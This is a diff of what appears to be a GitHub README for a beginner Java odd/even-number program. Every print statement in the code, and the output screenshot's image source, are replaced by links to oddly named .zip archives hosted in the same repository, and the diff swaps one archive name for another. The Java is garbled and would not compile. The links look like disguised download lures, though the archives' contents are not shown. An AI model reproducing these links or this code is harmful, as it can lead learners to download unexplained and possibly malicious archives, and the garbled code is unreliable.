@@ -61,19 +61,19 @@ o After finishing, click File > Exit to close Eclipse IDE.
 public class mithun {
     public static void main(String[] args) {
         int[] numbers = {12, 45, 23, 56, 89, 34, 67, 90, 11, 22}; 
-        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY--v2.5.zip("Even Numbers: ");
+        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/I_EVE_PRIN_JAV_A_PROGRA_T_ARRA_NUMBER_OD_AN_intercontorted.zip("Even Numbers: ");
         for (int num : numbers) {
             if (num % 2 == 0) {
-                https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY--v2.5.zip(num + " ");
+                https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/I_EVE_PRIN_JAV_A_PROGRA_T_ARRA_NUMBER_OD_AN_intercontorted.zip(num + " ");
             }
         }
 
-        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY--v2.5.zip(); // For a new line
+        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/I_EVE_PRIN_JAV_A_PROGRA_T_ARRA_NUMBER_OD_AN_intercontorted.zip(); // For a new line
 
-        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY--v2.5.zip("Odd Numbers: ");
+        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/I_EVE_PRIN_JAV_A_PROGRA_T_ARRA_NUMBER_OD_AN_intercontorted.zip("Odd Numbers: ");
         for (int num : numbers) {
             if (num % 2 != 0) {
-                https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY--v2.5.zip(num + " ");
+                https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/I_EVE_PRIN_JAV_A_PROGRA_T_ARRA_NUMBER_OD_AN_intercontorted.zip(num + " ");
             }
         }
     }
@@ -83,7 +83,7 @@ public class mithun {
 ## OUTPUT:
 
 
-<img width="1919" height="1070" alt="Screenshot 2025-09-02 154758" src="https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY--v2.5.zip" />
+<img width="1919" height="1070" alt="Screenshot 2025-09-02 154758" src="https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-PRINT-ODD-AND-EVEN-NUMBERS-IN-AN-ARRAY-/main/Helianthoidean/I_EVE_PRIN_JAV_A_PROGRA_T_ARRA_NUMBER_OD_AN_intercontorted.zip" />
 
 
 ## RESULT:
